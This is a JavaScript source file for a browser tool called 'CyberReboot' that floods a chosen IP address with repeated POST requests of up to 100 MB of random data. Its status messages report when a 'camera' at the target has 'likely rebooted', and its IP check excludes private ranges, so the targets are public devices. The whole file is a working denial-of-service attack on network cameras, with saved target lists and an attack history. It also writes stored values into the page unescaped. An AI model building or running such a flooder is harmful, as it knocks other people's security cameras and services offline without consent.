class CyberReboot {
    constructor(config) {
        this.ipInput = document.querySelector(config.ipInput);
        this.dataSlider = document.querySelector(config.dataSlider);
        this.dataAmount = document.querySelector(config.dataAmount);
        this.durationInput = document.querySelector(config.durationInput);
        this.durationUnit = document.querySelector(config.durationUnit);
        this.batchSelect = document.querySelector(config.batchSelect);
        this.saveIpBtn = document.querySelector(config.saveIpBtn);
        this.startBtn = document.querySelector(config.startBtn);
        this.stopBtn = document.querySelector(config.stopBtn);
        this.statusEl = document.querySelector(config.status);
        this.historyTable = document.querySelector(config.historyTable);
        this.isOverloading = false;
        this.abortController = null;

        this.init();
    }

    init() {
        // Update data amount display
        this.dataSlider.addEventListener('input', () => {
            this.dataAmount.textContent = this.dataSlider.value;
        });

        // Load saved IPs
        this.loadSavedIps();

        // Save IP
        this.saveIpBtn.addEventListener('click', () => {
            const ip = this.ipInput.value;
            if (this.validateIp(ip)) {
                let ips = JSON.parse(localStorage.getItem('saved-ips') || '[]');
                if (!ips.includes(ip)) {
                    ips.push(ip);
                    localStorage.setItem('saved-ips', JSON.stringify(ips));
                    this.loadSavedIps();
                    this.ipInput.value = '';
                }
            } else {
                alert('Invalid IP address');
            }
        });

        // Start Overload
        this.startBtn.addEventListener('click', () => this.startOverload());

        // Stop Overload
        this.stopBtn.addEventListener('click', () => this.stopOverload());

        // Load History
        this.loadHistory();
    }

    loadSavedIps() {
        const ips = JSON.parse(localStorage.getItem('saved-ips') || '[]');
        this.batchSelect.innerHTML = '<option value="">Single IP</option>';
        ips.forEach(ip => {
            const option = document.createElement('option');
            option.value = ip;
            option.textContent = ip;
            this.batchSelect.appendChild(option);
        });
    }

    loadHistory() {
        const history = JSON.parse(localStorage.getItem('history') || '[]');
        history.forEach(entry => this.addHistoryRow(entry));
    }

    addHistoryRow({ ip, dataMb, duration, timestamp }) {
        const row = document.createElement('tr');
        row.innerHTML = `
            <td class="py-1">${ip}</td>
            <td class="py-1">${dataMb} MB</td>
            <td class="py-1">${duration}s</td>
            <td class="py-1">${new Date(timestamp).toLocaleString()}</td>
        `;
        this.historyTable.prepend(row);
    }

    validateIp(ip) {
        const regex = /^(?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$/;
        return regex.test(ip) && !ip.startsWith('192.168.') && !ip.startsWith('10.');
    }

    async startOverload() {
        const ip = this.batchSelect.value || this.ipInput.value;
        const dataMb = parseInt(this.dataSlider.value);
        const duration = parseInt(this.durationInput.value) * (this.durationUnit.value === 'minutes' ? 60 : 1);

        if (!this.validateIp(ip) && !this.batchSelect.value) {
            alert('Invalid IP address');
            return;
        }

        this.isOverloading = true;
        this.abortController = new AbortController();
        this.startBtn.disabled = true;
        this.stopBtn.disabled = false;
        this.statusEl.textContent = `Status: Overloading ${ip} with ${dataMb} MB...`;

        const startTime = Date.now();
        let sentMb = 0;
        const endTime = startTime + duration * 1000;

        // Generate payload (split into chunks to avoid browser memory limits)
        const chunkSizeMb = Math.min(dataMb, 100); // Max 100 MB per request
        const payload = new ArrayBuffer(chunkSizeMb * 1024 * 1024);
        // Fill with random data
        const view = new Uint8Array(payload);
        for (let i = 0; i < view.length; i++) {
            view[i] = Math.random() * 255;
        }

        try {
            while (this.isOverloading && Date.now() < endTime && sentMb < dataMb) {
                await fetch(`http://${ip}`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/octet-stream' },
                    body: payload,
                    signal: this.abortController.signal
                }).catch(e => {
                    this.statusEl.textContent = `Status: Camera at ${ip} likely rebooted`;
                    this.isOverloading = false;
                });
                sentMb += chunkSizeMb;
                this.statusEl.textContent = `Status: Sent ${sentMb} MB to ${ip}...`;
            }
        } catch (e) {
            if (e.name !== 'AbortError') {
                this.statusEl.textContent = `Status: Error or camera rebooted`;
            }
        }

        if (this.isOverloading) {
            this.stopOverload();
        }

        const history = {
            ip,
            dataMb: sentMb,
            duration: (Date.now() - startTime) / 1000,
            timestamp: Date.now()
        };
        let historyList = JSON.parse(localStorage.getItem('history') || '[]');
        historyList.push(history);
        localStorage.setItem('history', JSON.stringify(historyList));
        this.addHistoryRow(history);
    }

    stopOverload() {
        this.isOverloading = false;
        if (this.abortController) {
            this.abortController.abort();
        }
        this.statusEl.textContent = 'Status: Stopped';
        this.startBtn.disabled = false;
        this.stopBtn.disabled = true;
    }
}